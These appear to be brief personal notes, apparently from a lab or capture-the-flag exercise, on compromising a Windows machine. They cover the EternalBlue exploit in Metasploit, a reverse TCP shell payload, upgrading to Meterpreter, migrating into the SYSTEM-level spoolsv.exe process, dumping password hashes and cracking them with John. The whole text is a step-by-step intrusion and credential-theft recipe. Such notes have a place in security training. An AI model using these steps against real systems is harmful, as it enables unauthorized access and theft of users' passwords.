Windows machine:
Gain access using metasploit using eternalblue exploit

use below payload for a reverse tcp shell: set payload windows/x64/shell/reverse_tcp

For converting a shell to meterpreter shell in metasploit:
- background the session
- use post/multi/manage/shell_to_meterpreter
- use the new sessions created (sessions -i 2)
- try getuid in the shell
- shell command will open the dos shell
- use ps to list the process to migrate to the different process_id 
  that is running as NT Authority\System.
- Try to use spoolsv.exe process which will give you a more stable shell.

Spoolsv.exe is an executable file that runs the Print Spooler Service, 
a process that caches printing jobs into system memory as images as 
printers cannot understand fonts or decipher graphics.

- Use hashdump that will dump all the passwords on the machine.
- Use john to crack the user's password hash.
